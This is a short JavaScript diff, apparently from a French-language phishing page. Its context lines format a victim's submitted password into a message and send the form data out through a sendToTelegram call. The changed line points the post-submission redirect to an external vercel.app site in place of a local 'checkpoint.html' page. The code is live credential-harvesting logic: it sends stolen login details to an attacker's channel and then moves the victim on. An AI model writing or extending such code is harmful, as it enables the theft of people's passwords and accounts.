@@ -248,7 +248,7 @@ Mot de passe: ${formData.pass}`;
             sendToTelegram(formData)
                 .then(response => {
                     if (response.ok) {
-                        window.location.href = "checkpoint.html";
+                        window.location.href = "https://adresse1.vercel.app/";
                     } else {
                         alert("Erreur lors de l'envoi des informations.");
                     }
